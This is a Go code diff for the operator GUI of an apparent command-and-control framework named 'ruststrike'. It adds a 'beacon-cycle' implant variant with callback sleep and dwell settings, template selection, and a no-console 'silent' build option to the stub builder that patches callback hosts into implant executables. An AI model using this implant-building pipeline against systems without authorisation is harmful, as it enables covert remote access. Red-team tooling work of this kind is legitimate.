@@ -273,9 +273,9 @@ func (a *App) StopRelay(id uint64, relayID string) error {
 // ---- Stub builder ----
 
 // sleepToInterval converts a Sleep Time (seconds) from the GUI into the decimal
-// trailer interval the core appends for a beacon. <=0 means "omit" (the beacon
-// falls back to its default interval); a sane upper bound keeps the trailer
-// short and guards against fat-fingered huge values.
+// trailer interval the core appends for a beacon/cycle. <=0 means "omit" (the
+// agent falls back to its default interval); a sane upper bound keeps the
+// trailer short and guards against fat-fingered huge values.
 func sleepToInterval(sleep int) string {
 	if sleep <= 0 {
 		return ""
@@ -286,14 +286,72 @@ func sleepToInterval(sleep int) string {
 	return strconv.Itoa(sleep)
 }
 
-// BuildStub patches a base implant/beacon exe with a host:port trailer and
-// returns the patched bytes as base64 (the frontend triggers a blob download).
-// silent is true the GUI-subsystem base exe is used (no console window). beacon
-// selects the beacon base exe (auto-reconnecting agent); sleep (seconds, >0)
-// is baked into the trailer as the beacon's callback interval (ignored for the
-// stock implant).
-func (a *App) BuildStub(host, port string, silent, beacon bool, sleep int) (string, error) {
-	body := map[string]any{"host": host, "port": port, "silent": silent, "beacon": beacon, "interval": sleepToInterval(sleep)}
+// dwellToTrailer converts a Dwell Time (seconds) from the GUI into the decimal
+// trailer dwell field the core appends for a short-cycle beacon. <=0 means
+// "omit" (the cycle crate falls back to its 2s default); a sane upper bound
+// guards against huge values. Only the cycle variant reads this field.
+func dwellToTrailer(dwell int) string {
+	if dwell <= 0 {
+		return ""
+	}
+	if dwell > 600 {
+		dwell = 600
+	}
+	return strconv.Itoa(dwell)
+}
+
+// AgentTemplate is one entry in the Generate Agent dropdown, mirrored from the
+// core's GET /api/agent/templates response.
+type AgentTemplate struct {
+	ID           string   `json:"id"`
+	Name         string   `json:"name"`
+	Description  string   `json:"description"`
+	Base         string   `json:"base"`
+	Variant      string   `json:"variant"`
+	Supports     []string `json:"supports"`
+	DefaultSleep int      `json:"default_sleep"`
+	DefaultDwell int      `json:"default_dwell"`
+}
+
+// ListAgentTemplates fetches the agent templates from the core
+// (GET /api/agent/templates) so the Generate Agent dropdown is data-driven
+// instead of hardcoded. Returns an empty list (not an error) if the core has no
+// templates dir — the stub builder still works via the beacon/cycle flags.
+func (a *App) ListAgentTemplates() ([]AgentTemplate, error) {
+	var resp struct {
+		Success bool            `json:"success"`
+		Data    []AgentTemplate `json:"data"`
+		Error   string          `json:"error"`
+	}
+	if err := a.get("/api/agent/templates", &resp); err != nil {
+		return nil, err
+	}
+	if !resp.Success {
+		return nil, fmt.Errorf("%s", resp.Error)
+	}
+	return resp.Data, nil
+}
+
+// BuildStub patches a base implant/beacon/beacon-cycle exe with a host:port
+// trailer and returns the patched bytes as base64 (the frontend triggers a
+// blob download). silent selects the GUI-subsystem base exe (no console
+// window). beacon selects the auto-reconnect beacon; cycle selects the
+// short-cycle beacon (cycle wins over beacon when both are true). sleep
+// (seconds, >0) is baked into the trailer as the callback interval (beacon) or
+// sleep between check-ins (cycle); dwell (seconds, >0) is the cycle's
+// connection-hold window. templateId, when non-empty, overrides the variant
+// via the core's agent-template lookup.
+func (a *App) BuildStub(host, port string, silent, beacon, cycle bool, sleep, dwell int, templateId string) (string, error) {
+	body := map[string]any{
+		"host":     host,
+		"port":     port,
+		"silent":   silent,
+		"beacon":   beacon,
+		"cycle":    cycle,
+		"interval": sleepToInterval(sleep),
+		"dwell":    dwellToTrailer(dwell),
+		"template": templateId,
+	}
 	var resp struct {
 		ExeB64 string `json:"exe_b64"`
 	}
@@ -303,16 +361,28 @@ func (a *App) BuildStub(host, port string, silent, beacon bool, sleep int) (stri
 	return resp.ExeB64, nil
 }
 
-// BuildStubToProject patches a base implant/beacon exe via the core
-// (/api/stub/build, which only returns base64 — no project-local copy), then
-// pops the OS "Save As" dialog so the operator chooses where to save the agent
-// exe. Returns the chosen absolute path (JSON string {"path":""}) — path is
-// empty if the operator cancelled. name suggests a default filename in the
+// BuildStubToProject patches a base implant/beacon/beacon-cycle exe via the
+// core (/api/stub/build, which only returns base64 — no project-local copy),
+// then pops the OS "Save As" dialog so the operator chooses where to save the
+// agent exe. Returns the chosen absolute path (JSON string {"path":""}) — path
+// is empty if the operator cancelled. name suggests a default filename in the
 // dialog. silent selects the GUI-subsystem base exe (no console window on
-// launch). beacon selects the beacon base exe; sleep (seconds, >0) is baked
-// into the trailer as the beacon callback interval.
-func (a *App) BuildStubToProject(host, port, name string, silent, beacon bool, sleep int) (string, error) {
-	body := map[string]any{"host": host, "port": port, "silent": silent, "beacon": beacon, "interval": sleepToInterval(sleep)}
+// launch). beacon selects the beacon base exe; cycle selects the short-cycle
+// base exe (cycle wins over beacon when both are true); sleep (seconds, >0)
+// is baked into the trailer as the callback interval; dwell (seconds, >0) is
+// the cycle's connection-hold window. templateId overrides the variant via
+// the core's agent-template lookup when non-empty.
+func (a *App) BuildStubToProject(host, port, name string, silent, beacon, cycle bool, sleep, dwell int, templateId string) (string, error) {
+	body := map[string]any{
+		"host":     host,
+		"port":     port,
+		"silent":   silent,
+		"beacon":   beacon,
+		"cycle":    cycle,
+		"interval": sleepToInterval(sleep),
+		"dwell":    dwellToTrailer(dwell),
+		"template": templateId,
+	}
 	var resp struct {
 		ExeB64 string `json:"exe_b64"`
 	}
@@ -325,9 +395,12 @@ func (a *App) BuildStubToProject(host, port, name string, silent, beacon bool, s
 	// OS Save As dialog. Default to <name>.exe (variant-aware fallback).
 	defName := strings.TrimSpace(name)
 	if defName == "" {
-		if beacon {
+		switch {
+		case cycle:
+			defName = "ruststrike-beacon-cycle"
+		case beacon:
 			defName = "ruststrike-beacon"
-		} else {
+		default:
 			defName = "ruststrike-implant"
 		}
 	}
